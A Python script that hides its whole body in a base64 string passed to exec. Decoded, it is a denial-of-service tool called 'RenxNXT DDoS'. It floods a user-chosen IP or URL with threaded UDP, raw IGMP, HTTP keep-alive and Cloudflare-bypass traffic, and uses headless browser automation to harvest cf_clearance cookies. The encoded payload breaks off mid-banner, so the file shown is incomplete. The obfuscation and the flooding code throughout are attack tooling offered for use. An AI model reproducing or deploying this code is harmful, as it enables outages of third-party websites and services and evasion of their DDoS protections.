import base64
exec(base64.b64decode("ZnJvbSBvcyBpbXBvcnQgc3lzdGVtLCBuYW1lCmltcG9ydCBvcywgdGhyZWFkaW5nLCAgc3lzLCBjbG91ZHNjcmFwZXIsIGRhdGV0aW1lLCB0aW1lLCBzb2NrZXQsIHNvY2tzLCBzc2wsIHJhbmRvbSwgaHR0cHgKZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHVybHBhcnNlCmltcG9ydCB1bmRldGVjdGVkX2Nocm9tZWRyaXZlciBhcyB3ZWJkcml2ZXIKZnJvbSBzeXMgaW1wb3J0IHN0ZG91dApmcm9tIGNvbG9yYW1hIGltcG9ydCBGb3JlLCBpbml0CmltcG9ydCBnZXRwYXNzCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKCmRlZiBjb3VudGRvd24odCk6CiAgICB1bnRpbCA9IGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpICsgZGF0ZXRpbWUudGltZWRlbHRhKHNlY29uZHM9aW50KHQpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiAodW50aWwgLSBkYXRldGltZS5kYXRldGltZS5ub3coKSkudG90YWxfc2Vjb25kcygpID4gMDoKICAgICAgICAgICAgc3Rkb3V0LmZsdXNoKCkKICAgICAgICAgICAgc3Rkb3V0LndyaXRlKCJcciAiK0ZvcmUuTUFHRU5UQSsiWypdIitGb3JlLkdSRUVOKyIgTEFVTkNIIEFUVEFDSyA9PiAiICsgc3RyKCh1bnRpbCAtIGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpKS50b3RhbF9zZWNvbmRzKCkpICsgIiBzZWMgbGVmdCAiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN0ZG91dC5mbHVzaCgpCiAgICAgICAgICAgIHN0ZG91dC53cml0ZSgiXHIgIitGb3JlLk1BR0VOVEErIlsqXSIrRm9yZS5CTFVFKyIgSVQnUyBET05FICEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxuIikKICAgICAgICAgICAgcmV0dXJuCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpkZWYgZ2V0X2luZm9fbDcoKToKICAgIHN0ZG91dC53cml0ZSgiXHgxYlszODsyOzI1NTsyMDsxNDdtIOKAoiAiK0ZvcmUuV0hJVEUrIlVSTCAgICAgICIrRm9yZS5MSUdIVENZQU5fRVgrIjogIitGb3JlLkxJR0hUR1JFRU5fRVgpCiAgICB0YXJnZXQgPSBpbnB1dCgpCiAgICBzdGRvdXQud3JpdGUoIlx4MWJbMzg7MjsyNTU7MjA7MTQ3bSDigKIgIitGb3JlLldISVRFKyJUSFJFQUQgICAiK0ZvcmUuTElHSFRDWUFOX0VYKyI6ICIrRm9yZS5MSUdIVEdSRUVOX0VYKQogICAgdGhyZWFkID0gaW5wdXQoKQogICAgc3Rkb3V0LndyaXRlKCJceDFiWzM4OzI7MjU1OzIwOzE0N20g4oCiICIrRm9yZS5XSElURSsiVElNRShzKSAgIitGb3JlLkxJR0hUQ1lBTl9FWCsiOiAiK0ZvcmUuTElHSFRHUkVFTl9FWCkKICAgIHQgPSBpbnB1dCgpCiAgICByZXR1cm4gdGFyZ2V0LCB0aHJlYWQsIHQKCmRlZiBnZXRfaW5mb19sNCgpOgogICAgc3Rkb3V0LndyaXRlKCJceDFiWzM4OzI7MjU1OzIwOzE0N20g4oCiICIrRm9yZS5XSElURSsiSVAgICAgICAgIitGb3JlLkxJR0hUQ1lBTl9FWCsiOiAiK0ZvcmUuTElHSFRHUkVFTl9FWCkKICAgIHRhcmdldCA9IGlucHV0KCkKICAgIHN0ZG91dC53cml0ZSgiXHgxYlszODsyOzI1NTsyMDsxNDdtIOKAoiAiK0ZvcmUuV0hJVEUrIlBPUlQgICAgICIrRm9yZS5MSUdIVENZQU5fRVgrIjogIitGb3JlLkxJR0hUR1JFRU5fRVgpCiAgICBwb3J0ID0gaW5wdXQoKQogICAgc3Rkb3V0LndyaXRlKCJceDFiWzM4OzI7MjU1OzIwOzE0N20g4oCiICIrRm9yZS5XSElURSsiVEhSRUFEICAgIitGb3JlLkxJR0hUQ1lBTl9FWCsiOiAiK0ZvcmUuTElHSFRHUkVFTl9FWCkKICAgIHRocmVhZCA9IGlucHV0KCkKICAgIHN0ZG91dC53cml0ZSgiXHgxYlszODsyOzI1NTsyMDsxNDdtIOKAoiAiK0ZvcmUuV0hJVEUrIlRJTUUocykgICIrRm9yZS5MSUdIVENZQU5fRVgrIjogIitGb3JlLkxJR0hUR1JFRU5fRVgpCiAgICB0ID0gaW5wdXQoKQogICAgcmV0dXJuIHRhcmdldCwgcG9ydCwgdGhyZWFkLCB0CiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKI3JlZ2lvbiBNRVRIT0QKZGVmIHJ1bmZsb29kZXIoaG9zdCwgcG9ydCwgdGgsIHQpOgogICAgdW50aWwgPSBkYXRldGltZS5kYXRldGltZS5ub3coKSArIGRhdGV0aW1lLnRpbWVkZWx0YShzZWNvbmRzPWludCh0KSkKICAgIHJhbmQgPSByYW5kb20uX3VyYW5kb20oNDA5NikKICAgIGZvciBfIGluIHJhbmdlKGludCh0aCkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdGhkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Zmxvb2RlciwgYXJncz0oaG9zdCwgcG9ydCwgcmFuZCwgdW50aWwpKQogICAgICAgICAgICB0aGQuc3RhcnQoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKZGVmIGZsb29kZXIoaG9zdCwgcG9ydCwgcmFuZCwgdW50aWxfZGF0ZXRpbWUpOgogICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5JUFBST1RPX0lHTVApCiAgICB3aGlsZSAodW50aWxfZGF0ZXRpbWUgLSBkYXRldGltZS5kYXRldGltZS5ub3coKSkudG90YWxfc2Vjb25kcygpID4gMDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNvY2suc2VuZHRvKHJhbmQsIChob3N0LCBpbnQocG9ydCkpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc29jay5jbG9zZSgpCiAgICAgICAgICAgIHBhc3MKCgpkZWYgcnVuc2VuZGVyKGhvc3QsIHBvcnQsIHRoLCB0LCBwYXlsb2FkKToKICAgIGlmIHBheWxvYWQgPT0gIiI6CiAgICAgICAgcGF5bG9hZCA9IHJhbmRvbS5fdXJhbmRvbSg2MDAwMCkKICAgIHVudGlsID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkgKyBkYXRldGltZS50aW1lZGVsdGEoc2Vjb25kcz1pbnQodCkpCiAgICAjcGF5bG9hZCA9IFBheWxvYWRzW21ldGhvZF0KICAgIGZvciBfIGluIHJhbmdlKGludCh0aCkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdGhkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VuZGVyLCBhcmdzPShob3N0LCBwb3J0LCB1bnRpbCwgcGF5bG9hZCkpCiAgICAgICAgICAgIHRoZC5zdGFydCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgc2VuZGVyKGhvc3QsIHBvcnQsIHVudGlsX2RhdGV0aW1lLCBwYXlsb2FkKToKICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKICAgIHNvY2suc2V0c29ja29wdChzb2NrZXQuU09MX1NPQ0tFVCwgc29ja2V0LlNPX1JFVVNFQUREUiwgMSkKICAgIHdoaWxlICh1bnRpbF9kYXRldGltZSAtIGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpKS50b3RhbF9zZWNvbmRzKCkgPiAwOgogICAgICAgIHRyeToKICAgICAgICAgICAgc29jay5zZW5kdG8ocGF5bG9hZCwgKGhvc3QsIGludChwb3J0KSkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzb2NrLmNsb3NlKCkKICAgICAgICAgICAgcGFzcwojcmVnaW9uIEdFVAoKZGVmIGdldF90YXJnZXQodXJsKToKICAgIHVybCA9IHVybC5yc3RyaXAoKQogICAgdGFyZ2V0ID0ge30KICAgIHRhcmdldFsndXJpJ10gPSB1cmxwYXJzZSh1cmwpLnBhdGgKICAgIGlmIHRhcmdldFsndXJpJ10gPT0gIiI6CiAgICAgICAgdGFyZ2V0Wyd1cmknXSA9ICIvIgogICAgdGFyZ2V0Wydob3N0J10gPSB1cmxwYXJzZSh1cmwpLm5ldGxvYwogICAgdGFyZ2V0WydzY2hlbWUnXSA9IHVybHBhcnNlKHVybCkuc2NoZW1lCiAgICBpZiAiOiIgaW4gdXJscGFyc2UodXJsKS5uZXRsb2M6CiAgICAgICAgdGFyZ2V0Wydwb3J0J10gPSB1cmxwYXJzZSh1cmwpLm5ldGxvYy5zcGxpdCgiOiIpWzFdCiAgICBlbHNlOgogICAgICAgIHRhcmdldFsncG9ydCddID0gIjQ0MyIgaWYgdXJscGFyc2UodXJsKS5zY2hlbWUgPT0gImh0dHBzIiBlbHNlICI4MCIKICAgICAgICBwYXNzCiAgICByZXR1cm4gdGFyZ2V0CgpkZWYgZ2V0X2Nvb2tpZSh1cmwpOgogICAgZ2xvYmFsIHVzZXJhZ2VudCwgY29va2llSkFSLCBjb29raWUKICAgIG9wdGlvbnMgPSB3ZWJkcml2ZXIuQ2hyb21lT3B0aW9ucygpCiAgICBhcmd1bWVudHMgPSBbCiAgICAnLS1uby1zYW5kYm94JywgJy0tZGlzYWJsZS1zZXR1aWQtc2FuZGJveCcsICctLWRpc2FibGUtaW5mb2JhcnMnLCAnLS1kaXNhYmxlLWxvZ2dpbmcnLCAnLS1kaXNhYmxlLWxvZ2luLWFuaW1hdGlvbnMnLAogICAgJy0tZGlzYWJsZS1ub3RpZmljYXRpb25zJywgJy0tZGlzYWJsZS1ncHUnLCAnLS1oZWFkbGVzcycsICctLWxhbmc9a29fS1InLCAnLS1zdGFydC1tYXhtaXplZCcsCiAgICAnLS11c2VyLWFnZW50PU1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTBfM18zIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwMy4zLjggKEtIVE1MLCBsaWtlIEdlY2tvKSBNb2JpbGUvMTRHNjAgTWljcm9NZXNzZW5nc3Nlbmdlci82LjUuMTggTmV0VHlwZS9XSUZJIExhbmd1YWdlL2VuJwogICAgXQogICAgZm9yIGFyZ3VtZW50IGluIGFyZ3VtZW50czoKICAgICAgICBvcHRpb25zLmFkZF9hcmd1bWVudChhcmd1bWVudCkKICAgIGRyaXZlciA9IHdlYmRyaXZlci5DaHJvbWUob3B0aW9ucz1vcHRpb25zKQogICAgZHJpdmVyLmltcGxpY2l0bHlfd2FpdCgzKQogICAgZHJpdmVyLmdldCh1cmwpCiAgICBmb3IgXyBpbiByYW5nZSg2MCk6CiAgICAgICAgY29va2llcyA9IGRyaXZlci5nZXRfY29va2llcygpCiAgICAgICAgdHJ5eSA9IDAKICAgICAgICBmb3IgaSBpbiBjb29raWVzOgogICAgICAgICAgICBpZiBpWyduYW1lJ10gPT0gJ2NmX2NsZWFyYW5jZSc6CiAgICAgICAgICAgICAgICBjb29raWVKQVIgPSBkcml2ZXIuZ2V0X2Nvb2tpZXMoKVt0cnl5XQogICAgICAgICAgICAgICAgdXNlcmFnZW50ID0gZHJpdmVyLmV4ZWN1dGVfc2NyaXB0KCJyZXR1cm4gbmF2aWdhdG9yLnVzZXJBZ2VudCIpCiAgICAgICAgICAgICAgICBjb29raWUgPSBmIntjb29raWVKQVJbJ25hbWUnXX09e2Nvb2tpZUpBUlsndmFsdWUnXX0iCiAgICAgICAgICAgICAgICBkcml2ZXIucXVpdCgpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgdHJ5eSArPSAxCiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgZHJpdmVyLnF1aXQoKQogICAgcmV0dXJuIEZhbHNlCiNyZWdpb24gU09DCmRlZiBMYXVuY2hTT0ModXJsLCB0aCwgdCk6CiAgICB0YXJnZXQgPSBnZXRfdGFyZ2V0KHVybCkKICAgIHVudGlsID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkgKyBkYXRldGltZS50aW1lZGVsdGEoc2Vjb25kcz1pbnQodCkpCiAgICByZXEgPSAgIkdFVCAiK3RhcmdldFsndXJpJ10rIiBIVFRQLzEuMVxyXG5Ib3N0OiAiICsgdGFyZ2V0Wydob3N0J10gKyAiXHJcbiIKICAgIHJlcSArPSAiVXNlci1BZ2VudDogIiArIHJhbmRvbS5jaG9pY2UodWEpICsgIlxyXG4iCiAgICByZXEgKz0gIkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45XHJcbiciCiAgICByZXEgKz0gIkNvbm5lY3Rpb246IEtlZXAtQWxpdmVcclxuXHJcbiIKICAgIGZvciBfIGluIHJhbmdlKGludCh0aCkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdGhkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9QXR0YWNrU09DLCBhcmdzPSh0YXJnZXQsIHVudGlsLCByZXEpKQogICAgICAgICAgICB0aGQuc3RhcnQoKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKZGVmIEF0dGFja1NPQyh0YXJnZXQsIHVudGlsX2RhdGV0aW1lLCByZXEpOgogICAgaWYgdGFyZ2V0WydzY2hlbWUnXSA9PSAnaHR0cHMnOgogICAgICAgIHMgPSBzb2Nrcy5zb2Nrc29ja2V0KCkKICAgICAgICBzLnNldHNvY2tvcHQoc29ja2V0LklQUFJPVE9fVENQLCBzb2NrZXQuVENQX05PREVMQVksIDEpCiAgICAgICAgcy5jb25uZWN0KChzdHIodGFyZ2V0Wydob3N0J10pLCBpbnQodGFyZ2V0Wydwb3J0J10pKSkKICAgICAgICBzID0gc3NsLmNyZWF0ZV9kZWZhdWx0X2NvbnRleHQoKS53cmFwX3NvY2tldChzLCBzZXJ2ZXJfaG9zdG5hbWU9dGFyZ2V0Wydob3N0J10pCiAgICBlbHNlOgogICAgICAgIHMgPSBzb2Nrcy5zb2Nrc29ja2V0KCkKICAgICAgICBzLnNldHNvY2tvcHQoc29ja2V0LklQUFJPVE9fVENQLCBzb2NrZXQuVENQX05PREVMQVksIDEpCiAgICAgICAgcy5jb25uZWN0KChzdHIodGFyZ2V0Wydob3N0J10pLCBpbnQodGFyZ2V0Wydwb3J0J10pKSkKICAgIHdoaWxlICh1bnRpbF9kYXRldGltZSAtIGRhdGV0aW1lLmRhdGV0aW1lLm5vdygpKS50b3RhbF9zZWNvbmRzKCkgPiAwOgogICAgICAgIHRyeToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UoMTAwKToKICAgICAgICAgICAgICAgICAgICBzLnNlbmQoc3RyLmVuY29kZShyZXEpKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKI3JlZ2lvbiBDRkIKZGVmIExhdW5jaENGQih1cmwsIHRoLCB0KToKICAgIHVudGlsID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkgKyBkYXRldGltZS50aW1lZGVsdGEoc2Vjb25kcz1pbnQodCkpCiAgICBzY3JhcGVyID0gY2xvdWRzY3JhcGVyLmNyZWF0ZV9zY3JhcGVyKCkKICAgIGZvciBfIGluIHJhbmdlKGludCh0aCkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdGhkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9QXR0YWNrQ0ZCLCBhcmdzPSh1cmwsIHVudGlsLCBzY3JhcGVyKSkKICAgICAgICAgICAgdGhkLnN0YXJ0KCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBBdHRhY2tDRkIodXJsLCB1bnRpbF9kYXRldGltZSwgc2NyYXBlcik6CiAgICB3aGlsZSAodW50aWxfZGF0ZXRpbWUgLSBkYXRldGltZS5kYXRldGltZS5ub3coKSkudG90YWxfc2Vjb25kcygpID4gMDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNjcmFwZXIuZ2V0KHVybCwgdGltZW91dD0xNSkKICAgICAgICAgICAgc2NyYXBlci5nZXQodXJsLCB0aW1lb3V0PTE1KQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwoKI2VuZHJlZ2lvbgoKZGVmIGNsZWFyKCk6IAogICAgaWYgbmFtZSA9PSAnbnQnOiAKICAgICAgICBzeXN0ZW0oJ2NscycpCiAgICBlbHNlOiAKICAgICAgICBzeXN0ZW0oJ2NsZWFyJykKICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZGVmIGhlbHAoKToKICAgIGNsZWFyKCkKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIrRm9yZS5MSUdIVFdISVRFX0VYICAgKyIgIOKVpiDilabilZTilZDilZfilaYgIOKVlOKVkOKVlyAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIrRm9yZS5MSUdIVENZQU5fRVggICAgKyIgIOKVoOKVkOKVo+KVkeKVoyDilZEgIOKVoOKVkOKVnSAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIrRm9yZS5MSUdIVENZQU5fRVggICAgKyIgIOKVqSDilanilZrilZDilZ3ilanilZDilZ3ilakgICAgICAgICAgICAgICAgXG4iKQogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVggICAgICAgICAgICArIiAgICAgICAg4pWQ4pWQ4pWm4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWm4pWQ4pWQXG4iKQogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVggICAgICAgICAgICArIuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVqeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVqeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVl1xuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJTT0MgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgU29ja2V0IEF0dGFjayAgICAgICAgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJUQ1AgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgVGNwIEF0dGFjayAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJVRFAgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgVWRwIEF0dGFjayAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJDRkIgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgQ2xvdWRmbGFyZSBCeXBhc3MgQXR0YWNrICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJjcmVkaXQgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgU2hvdyBjcmVkaXQgICAgICAgICAgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJleGl0ICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgRXhpdCBSZW54TlhUIEREb1MgICAgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilaDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilaNcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCAgICAgICAgICAgICsi4pWRIFx4MWJbMzg7MjsyNTU7MjA7MTQ3beKAoiAiK0ZvcmUuTElHSFRXSElURV9FWCsiVEhBTksgICAgIitGb3JlLkxJR0hUQ1lBTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgVGhhbmtzIGZvciB1c2luZyBSZW54TlhUICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZEgXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYKyJZT1XimaUgICAgICIrRm9yZS5MSUdIVENZQU5fRVgrInwiK0ZvcmUuTElHSFRXSElURV9FWCsiIFBseiBzdGFyIHByb2plY3QgOikgICAgICAgICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYKyLilZFcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAiK0ZvcmUuTElHSFRHUkVFTl9FWCAgICAgICAgICAgICsi4pWRIFx4MWJbMzg7MjsyNTU7MjA7MTQ3beKAoiAiK0ZvcmUuTElHSFRXSElURV9FWCsiZ2l0aHViICAgIitGb3JlLkxJR0hUQ1lBTl9FWCsifCIrRm9yZS5MSUdIVFdISVRFX0VYKyIgZ2l0aHViLmNvbS9SZW5uQ2xvdWQgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUR1JFRU5fRVgrIuKVkVxuIikKICAgIHN0ZG91dC53cml0ZSgiICAgICAgICAgICAgICIrRm9yZS5MSUdIVEdSRUVOX0VYICAgICAgICAgICAgKyLilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ1cbiIpCiAgICBzdGRvdXQud3JpdGUoIlxuIikKICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZGVmIGNyZWRpdCgpOgogICAgc3Rkb3V0LndyaXRlKCJceDFiWzM4OzI7MDsyMzY7MjUwbeKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVl1xuIikKICAgIHN0ZG91dC53cml0ZSgiXHgxYlszODsyOzI1NTsyMDsxNDdt4oCiICIrRm9yZS5MSUdIVFdISVRFX0VYICAgKyJEZXZlbG9wZXIgIitGb3JlLlJFRCsiOiBceDFiWzM4OzI7MDsyNTU7MTg5bVJlblh2XG4iKQogICAgc3Rkb3V0LndyaXRlKCJceDFiWzM4OzI7MjU1OzIwOzE0N23igKIgIitGb3JlLkxJR0hUV0hJVEVfRVggICArIlVJIERlc2lnbiAiK0ZvcmUuUkVEKyI6IFx4MWJbMzg7MjswOzI1NTsxODltUmVuWHZcbiIpCiAgICBzdGRvdXQud3JpdGUoIlx4MWJbMzg7MjsyNTU7MjA7MTQ3beKAoiAiK0ZvcmUuTElHSFRXSElURV9FWCAgICsiTWV0aG9kcy9Ub29scyAiK0ZvcmUuUkVEKyI6IFx4MWJbMzg7MjswOzI1NTsxODltUmVuWHZcbiIpCiAgICBzdGRvdXQud3JpdGUoIlx4MWJbMzg7MjswOzIzNjsyNTBt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdXG4iKQogICAgc3Rkb3V0LndyaXRlKCJcbiIpICAgIAojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmRlZiB0aXRsZSgpOgogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcbiIpCiAgICBzdGRvdXQud3JpdGUoIiAgICAgICAgICAgICAgICAgICAiK0ZvcmUuTElHSFRXSElURV9FWCAgKyLilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4pWXICAg4paI4paI4pWX4paI4paI4paI4pWXICAg4paI4paI4pWX4paI4paI4pWXICDilojilojilZcgICAgICAgICAgICAgXG4iKQogICAgc3Rkb3V0LndyaXRlKCIgICAgICAgICAgICAgICAgICAgIitGb3JlLkxJR0hUV0hJVEVfRVggICsi4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4paI4paI4pWXICDilojilojilZHilojilojilojilojilZcgIOKWiOKWiOKVkeKVmuKWiOKWiOKVl+KWiOKWiOKVlOK